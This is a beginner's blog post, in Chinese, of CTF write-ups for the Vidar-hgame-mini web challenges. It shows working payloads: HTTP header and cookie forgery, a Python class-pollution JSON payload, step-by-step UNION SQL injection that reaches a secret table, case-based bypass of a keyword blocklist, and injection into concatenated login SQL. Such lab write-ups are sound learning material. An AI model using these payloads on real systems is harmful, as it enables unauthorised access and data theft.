---
layout:     post
title:      我的 Vidar-hgame-mini 解题过程
subtitle:   信息安全领域的第一次接触
author:     U1traVeno
date:       2024-08-23
img:        img/tag-bg.jpg
tags:
    - Web
    - CTF
    - Vidar
--- 

> 将在hgame-mini结束之前长期更新

这篇文章将记录自己解题的心路历程。写的可能比较杂，按照自己做题顺序。不定期更新。

各个领域的start题目看完，发现自己大概还是对web更感兴趣一点。所以大概率这里大多数都是web的题(甚至全是

-----

*2024-08-23*

## Do you know http (100pt)

了解了一下http请求是怎么构成的。

[http消息结构 (runoob)](https://www.runoob.com/http/http-messages.html)

打开F12, 刷新靶机网站，定睛一看，响应头里有个Hint

![Hint](/img/in-post/2024-08-23-1.png)

Please use the HTTP header field that identifies the address of the web page, from which the resource has been requested.

这是啥意思。它还说要从vidar.club来到这个页面。

在 [Web安全学习笔记](https://websec.readthedocs.io/zh/latest/) 里面找到了这个

需要注意的是，Referer是错误的拼写，就像creat一样，把错误的一直沿用了下来。

![Referer请求头](/img/in-post/2024-08-23-2.png)

于是我试着把刚刚接收到的http请求加上这个字段重发一下

![加上字段](/img/in-post/2024-08-23-3.png)

但是不行。响应头除了时间是一样的。于是就在这里卡住了。

*2024-8-24-01:07*

---

卡住的原因和那个https输入不了的问题有关。问了l1nk, 他告诉我这里直接输入[vidar.club](vidar.club)就好，不用加上前面的`https://`。但是Firefox的开发者不加这个是没法发过去的呀！遂下了一个Hackbar插件在firefox上，叫做 [HackBar V2](https://addons.mozilla.org/zh-CN/firefox/addon/hackbar-free/) 。用它就可以随意的修改Referer了。

![24-8-24-1](/img/in-post/2024-08-24-1.png)

看到新提示，应该是user-agent。直接复制过来重新Excecute

![24-8-24-2](/img/in-post/2024-08-24-2.png)

现在提示说让请求从本地来到这个页面，一开始以为是`Referer: http://127.0.0.1/`。但是并不是这样。

加上了`Origin: http://127.0.0.1/`。

但并不行，又试了一下`X-Forwarded-For: 127.0.0.1`，可行。这两个有什么区别呢？

下一个提示是：
> Hello guest! only admin can get flag.


所以要伪装成管理员。

注意到Cookies中，有一个user=guest。改成user=admin。

下一个提示：
> You are admin! Flag is in this page


又一次卡住了。之前学到的在html里面找元素的方法失效了，没找到flag。

---

更新，找不到是因为其实响应头里面有一个Fl4g: 但是请看
![082403](/img/in-post/2024-08-24-3.png)
现已解决

## How to use developer tools (100pt)

打开F12, 发现html里面给这些按钮加上了`onclick="return False"`。把这些改掉就可以跳转了。

![html](/img/in-post/2024-08-23-4.png)

根据提示来到182.xx.xx.xx:xxxxx/L00kAtME.php

![L00kAtME](/img/in-post/2024-08-23-5.png)

`disabled="disabled"`?? 删！

![删](/img/in-post/2024-08-23-6.png)

这里只拿到一部分flag。另一部分在f12网络模块GET到的一个包里面的消息头。

f12有用捏

## Get Post Universe (150pt)

根据名字，是要用到 GET 和 POST 两个方法吗？

并没有。GET请求里加上了Money: 10000没有效果。

在网址后面加上`/?money=10000`, 行了。
![082404](/img/in-post/2024-08-24-4.png)

第二个提示。POST card_id=xxx。

用之前的Hackbar去POST一个参数。记得点一下load URL，图片中忘记点了。之后便得到Flag
![082405](/img/in-post/2024-08-24-5.png)
![082406](/img/in-post/2024-08-24-6.png)

## Vidar Shop (150pt)
把100pt的题做完了，来到150pt的题。

附件有一个src,这里贴一下源码
```python
# app.py  

from flask import Flask, render_template, request, jsonify
app = Flask(__name__)
class money:
    balance=30
    def __init__(self):
        pass
flag_file_path = "flag"
def update(src,dst):
    for key, value in src.items():
        if hasattr(dst, '__getitem__'):  #这里判断dst是否为字典.字典有一个__getitem__方法  
            if dst.get(key) and type(value) == dict:
                update(value, dst.get(key))
            else:
                dst[key] = value
        elif hasattr(dst, key) and type(value) == dict:
            update(value, getattr(dst, key))
        else:
            setattr(dst, key, value)
@app.route('/', methods=['POST', 'GET'])
def purchase_item():    
    try:
        if request.method == 'POST':
            data = request.get_json()
            item = data.get('item') 

            if item == 'flag':
                price=50
                if money.balance >= price:
                    money.balance-= price
                    with open(flag_file_path, 'r') as flag_file:
                        flag = flag_file.read()
                    return jsonify({'message': f'成功购买 flag！您的新余额为 {money.balance}', 'flag': flag})
                else:
                    return jsonify({'error': '余额不足以购买 flag。'}), 400
            elif item == 'apple':
                price=20
                if money.balance >= price:
                    money.balance -= price
                    return jsonify({'message': f'成功购买苹果！您的新余额为 {money.balance}'})
                else:
                    return jsonify({'error': '余额不足以购买苹果。'}), 400
            else:
                return jsonify({'error': '指定的物品无效。'}), 400
        elif request.method == 'GET':
            return render_template('index.html', balance=money.balance)
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    
@app.route("/update", methods=['POST'])
def callupdate():
    m=money()
    try:
        data = request.get_json()
        update(data, m)
        return jsonify({'message':'success!'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
if __name__ == '__main__':
    app.run(host='0.0.0.0',port='5000', debug=False)
```

既然给了源码，应该就是要我利用这个源码吧。

学习了一下，又向chatGPT请教请教，发现`route`指的是路由。比如前面的`purchase_item`就可以在`/`这个路径直接访问到。而要访问下面的`callupdate`就需要向`/update` 去POST一个请求，要让balance变成50。

理论存在，实践开始。
![082407](/img/in-post/2024-08-24-7.png)
然后服务器炸了。

重来。这次加上了这个字段，但这次Execute点击不了了。
![082408](/img/in-post/2024-08-24-8.png)

于是简单写了一个curl
```shell
$ curl -X POST http://182.202.178.28:31828/update -H "Content-Type: application/json" -d '{"balance": 99999}'

{"message":"success!"}

```
看起来成功了,但是刷新了一下网页还是没有成功修改掉money. 为什么这里会显示success但实际上并没有改变呢?        

问了CA(shallot)学姐, 答复是要学习一下python的__global__和原型链.

于是google到这个.[浅谈Python原型链污染及其利用方式](https://xz.aliyun.com/t/13072?time__1311=GqmhBKwKGNDKKYIeAIhwSK5HjPPD&u_atoken=4da8751b2a27be3c410c815671cdeb99&u_asession=01RKQ_i9Q2xwPykcmNCiBf_MYF5l93cBXy2Iu6DNFew7NwT-mSLB0Ols9xNuIuCB9TJB-YY_UqRErInTL5mMzm-GyPlBJUEqctiaTooWaXr7I&u_asig=05Nf4aJmrgWQm39QPlqR9RAb3Uaui-I5MCif8RRP7-zSpaHe5TOZm42vcTh16k9EMmw9JE273ILeNMtRVJAC5aNw72I7RUdCPI5h9D8y-dAY0-3_Ba9z2SEUQAzromwYEwhclVX9suqM1qcIUrmfX1t97HcOrKRbovtkYJyFd7je_BzhvSc0Kr8URjOX9Xe4tkEscUgwbgw8sy7VpHxgf54gT5b5aQzFzzAOQ9aBJH7h6aP54FOH0O6v3alqyEQXW2ss0ZZR5_JcJr9YBaBtgQptJXPZ4DSetRP_7fbi_xq656gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=1VoZ%2BXE%2BG%2FO06LRrqvMxwaxWs5Q%3D)

之前光搜了一下原型链, 发现都是搜到JS原型链, JS要学html, 全串起来了, 发现自己缺了好多好多知识. 学姐表示我不需要学这么多. (但是其实最后都是要学的.)其实python就可以实现原型链. 这里贴一下我对原型链的理解

又有学长表示其实我应该可以做一下攻防世界的Web入门11题, 做完之后可以了解各种工具的使用. 这个如果我后面做了~~的同时还想写题解~~的话会放到[另一篇博客]()
### 原型链
- 贴个链接. 这里主要在知乎上学习的. [彻底搞懂原型和原型链](https://zhuanlan.zhihu.com/p/636413986)

- 原型链当然和原型有关. 原型是什么?
- JS中的每一个对象都与另一个对象关联. 这个关联对象叫**原型**(prototype). 个人感觉其实可以用其他语言中的父类对其理解. 原型链其实就是类的继承构成的链.

- 当你访问一个对象的属性或方法时，如果该对象本身没有这个属性或方法，JavaScript 会在它的原型对象上查找。这种查找会沿着原型链向上，一直查找到`null`（顶层对象的原型）为止。

回到题解. 这题可以利用Python的一些特性实现类似JS的原型链污染的操作. 详见上面博客. 

> Python原型链污染和Nodejs原型链污染的根本原理一样，Nodejs是对键值对的控制来进行污染，而Python则是对类属性值的污染，且只能对类的属性来进行污染不能够污染类的方法。

那么这里其实有三个思路, 一个是把自己的balance提高, 另一个是把苹果改成flag, 或者是把flag的价格改低.   
但是后来发现好像只有第一个可行(((       

> 在函数或类方法中，我们经常会看到__init__初始化方法，但是它作为类的一个内置方法，在没有被重写作为函数的时候，其数据类型会被当做装饰器，而装饰器的特点就是都具有一个全局属性__globals__属性，__globals__ 属性是函数对象的一个属性，用于访问该函数所在模块的全局命名空间。具体来说就是，__globals__ 属性返回一个字典，里面包含了函数定义时所在模块的全局变量。

```python
if __name__ == '__main__':
    print(money.balance) # 30  
    m = money()
    globals()['money'].balance = 50
    print(money.balance) # 50  
    payload = {
        "__init__":{
            "__globals__":{
                "money":{
                    "balance":999
                }
            }
        }
    }
    update(payload, m)
    print(money.balance) # 999  
```
                    
这里已经通过更改传入update的参数已经可以修改到全局类`money`中的类属性值.

只需要把这串json字符串传到`/update`就可以了. 会看到网页中的余额变成999, 便能愉快的买到好多好多flag(((

## Book Management System(150pt)

本题考察SQL注入, 有时候缩写成sqli(SQL Injection).

贴一个[SQL注入的基础入门讲解文档](https://hdu-cs.wiki/2023%E6%97%A7%E7%89%88%E5%86%85%E5%AE%B9/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL%20%E6%B3%A8%E5%85%A5)
> 非常好文档, 爱来自[hdu-cs.wiki](hdu-cs.wiki)

刚开始接触SQL注入, 会感觉有点懵懵的, 这是因为还不够熟悉SQL语句. 其实多玩两题就熟悉了.

![092501](/img/in-post/2024-09-25-1.png)

往这个输入框输入书的ID, 就会返回一些东西. 

![092502](/img/in-post/2024-09-25-2.png)

尝试输入`1'#`, 则会报错, 这是为什么呢?

![092503](/img/in-post/2024-09-25-3.png)

其实抓包后会发现, 其实并没有真的发送这个`#`.

原理是`#`会自动被浏览器处理为特殊字符, 这是因为`#`是 URL 中的保留字符，它通常用于标识 [URL 的**片段标识符**](https://zh.wikipedia.org/wiki/URI%E7%89%87%E6%AE%B5)（fragment identifier）。浏览器在解析 URL 时，遇到`#`后会将其视为页面片段的开始，而不会将它发送到服务器。

因此, 我们在这里需要在浏览器中把`#`换成`%23`. `%23` 是 `#` 的 [URL 编码](https://www.urlencoder.io/)形式，通过这种方式，浏览器将会把编码后的字符串 `%23` 发送到服务器，而不是将其视为片段标识符.

![092505](/img/in-post/2024-09-25-5.png)

或者直接编辑数据包

![092506](/img/in-post/2024-09-25-6.png)

通过学习上面给出的sqli教程, 相信你一定熟练掌握了sqli了.(x

本题可以采用联合注入. 

第一步是尝试出这个查询语句查询结果应该为多少列, 因为联合查询语句前后查询的列数量应当相同, 否则报错
```
>>> 0' union select 1;%23

{"error":"Error 1222: The used SELECT statements have a different number of columns"}
```

通过增加查询的列数, 直到不再报错.

```
>>> 0' union select 1, 2, 3;%23

Vidar-Team has 3 books called 2
```
> 为什么这里要用`0'`加上union的语句呢? 因为0这个id不存在, 查询结果为空, 这样才能把我们union的查询结果放在第一行作为正常输出. 也就是说, 这里的 0 换成 -1 换成 9999 都是可以的


此处已经可以猜测到, 查询的第二列会被作为书名, 第一列为id, 第三列为数量

为什么第二列放在第一个说呢? 因为它很重要. 它是三个数据中唯一一个字符串为值的. 我们可以用它输出我们想要的数据. 不然的话会查不到
```
>>> 0' union select 1, 2, group_concat(table_name) from information_schema.tables;%23

手写写不完了，就写个十几条吧，有空可以来协会看看到底有多少书捏～
```

所以我们既然要from一个表名中找到什么东西, 那我们肯定得找到表名, 找到列名. 先找一下表名吧.

```
>>> 0' union select 1, group_concat(table_name separator "%0A"), 3 from information_schema.tables;%23

Vidar-Team has 3 books called books
secret
ADMINISTRABLE_ROLE_AUTHORIZATIONS
APPLICABLE_ROLES
CHARACTER_SETS
CHECK_CONSTRAINTS
COLLATIONS
COLLATION_CHARACTER_SET_APPLICABILITY
COLUMNS
COLUMNS_EXTENSIONS
COLUMN_PRIVILEGES
.......太多了此处省略
```
感觉发现了很多不得了的东西, 最不得了的就是那个叫secret的表了. 这里给出了特别多其实无关紧要的东西, 因为我们没有加上`where table_schema=database()`.

再来看看列名
```
>>> 0' union select 1, group_concat(column_name), 3 from information_schema.columns where table_schema=database();%23

Vidar-Team has 3 books called id,name,number,fl4g
```

接下来拿到flag就易如反掌了
```
>>> 0' union select 1, fl4g, 3 from secret;%23

Vidar-Team has 3 books called VIDAR{1t_1s_4_f4k3_fl4g}
``` 
## Book Management System V2(200pt)
其实这题只是上一个题目简单的加上一点字符串的过滤, 挺无聊的.

大概应该是这样实现的:
```go
func Waf(code string) bool {
    fmt.Println(code)
    blacklist := []string{"select", "SELECT", "from", "FROM", "where", "WHERE", "union", "UNION", "or", "OR", "and", "AND", "+", "-", "=", "database()"}
    for _, s := range blacklist {
        if strings.Contains(code, s) {
            return false
        }
    }
    return true
}
```
如果出现了上述字符串, 就会说
> 哼!就这水平还想拿flag？

简单的大小写绕过就行, 我猜没有人真的会这样防御sqli

## 呜呜呜我要学英语(200pt)
本题让人了解如何用python编写发包脚本. 利用Requests模块.

简单的直接从runoob上看看requests模块怎么用就可以了. http消息体怎么构造可以去随便抓个包看看啥样子.  对于要往哪个路由发请求, 完全可以通过阅读页面源代码来得知. 往`/question`发个GET会得到所有的题目信息, 往`/api/answer`POST答题, 往`/api/score`POST获取分数, 分数够了之后往`/api/ok`发包即可. 

为了保留住cookies, 我们需要新建一个`requests.Session`对象, 它会自动处理cookies.

需要注意的是, 对于一个request类, 用text方法获取到的消息体, 是字符串格式的. 这里需要用python的`json`库将这个字符串变成json格式的python字典
```python
question_list_text = requests.get(url+"/questions").text # 这是字符串  
print(len(question_list_text)) # 95654  
question_list = json.loads(question_list_text) # 这是嵌套列表的字典  
print(len(question_list))  # 600  
```
题目的本意是让人获取到这个题库的答案列表之后, 批量对每一个题目发送对应的答案, 但是大家似乎都没这么做

大家的做法:
1. 调用翻译接口, 找相似度最高的
2. abcd每个选项都试一次, 因为服务器会告诉你`{"correct":"true"}`.
3. 把问题全抛给GPT, 然后自己点. 

我其实是走的第二个路线, 但因为写了个死循环产生了第四个路线: 只答第一题, 因为只会答第一题.
```python
# Post Answer   
"""
这里其实写错了
while True没加break,结果重复答第一题,但是分数一直在加.
最后直接获取flag了
应该在try语句末尾加break的
"""
# answer_list = ['B','这里本来应该是另外599个答案']   
hack_s = requests.Session()
hack_s.get(url=url)
print(f"answer_list:{answer_list}")
for question_index in range(0,600):
    while True:
        try:
            answer_post_json = {"questionIndex":question_index,"selectedAnswer":answer_list[question_index]}
            print(f"Posting quesion{question_index}. Answer:{answer_list[question_index]}", end=' ')
            answer_response_post = hack_s.post(url=url+"/api/answer", json=answer_post_json, timeout=3)
            print("Success!")
            # 可以看到这里忘了加 break  
        except requests.exceptions.Timeout:
            print("Timeout. Retrying.")
    while True:
        try:
            print("Getting current score.", end=' ')
            score_response_post = hack_s.post(url=url+"/api/score", timeout=3)
            print("Success!")
            current_score = json.loads(score_response_post.text)['score']
            print(f"Current score:{current_score}")
            # 可以看到这里也忘了加 break  
        except requests.exceptions.Timeout: 
            print("Timeout. Retrying.")

```
输出是这样的
```

answer_list:['B', '这里本来是另外599个答案']
Posting quesion0. Answer:B Success!
Getting current score. Success!
Current score:1
Posting quesion0. Answer:B Success!
Getting current score. Success!
Current score:2
Posting quesion0. Answer:B Success!
Getting current score. Success!
Current score:3
Posting quesion0. Answer:B Success!
Getting current score. Success!
Current score:4
Posting quesion0. Answer:B Success!
Getting current score. Success!
Current score:5
Posting quesion0. Answer:B Success!
Getting current score. Success!
Current score:6
...
KeyboardInterrupt

```
于是再用这个`hack_s`往`/api/ok`发个请求就拿到flag了.

## Go Ahead(200pt)
本题考察[Go SSTI(Golang Server Side Template Injection)](https://exploit-notes.hdks.org/exploit/web/go-ssti/)

仔细阅读模板的源码(gin.Context), GET的时候传个tmpl的参数, 就能让服务器返回它看到的请求, 可以看到flag. 题目的提示很明显了.

Go SSTI比较没啥用
## Vidar-Mail(200pt)
本题实际上想考察利用SQL约束攻击来获取管理员账户权限, 但我因为发现源码中有这样的东西:
```go
func login(c *gin.Context) {
    
    ...

	query := "SELECT username FROM users WHERE username = '" + user.Username + "' AND password = '" + user.Password + "'"

	err = db.QueryRow(query).Scan(&username)

	if err != nil && err != sql.ErrNoRows {
		c.JSON(500, gin.H{"error": "Internal server error"})
		fmt.Println(err)
		return
	}

	if username == "" {
		c.JSON(400, gin.H{"error": "Invalid username or password"})
		return
	}
	role := "user"
	if strings.Trim(username, " ") == "admin" {
		role = "admin"
	}
	
    ...

```
竟然直接拼接字符串吗? 那只好把你狠狠地注入了~   
![092701](/img/in-post/2024-09-27-1.png)
后面看看源码让自己干啥就行

其实普通用户也能控制邮件发出人是谁, 根本不是只读. 抓取一下发邮件的包就知道了.




 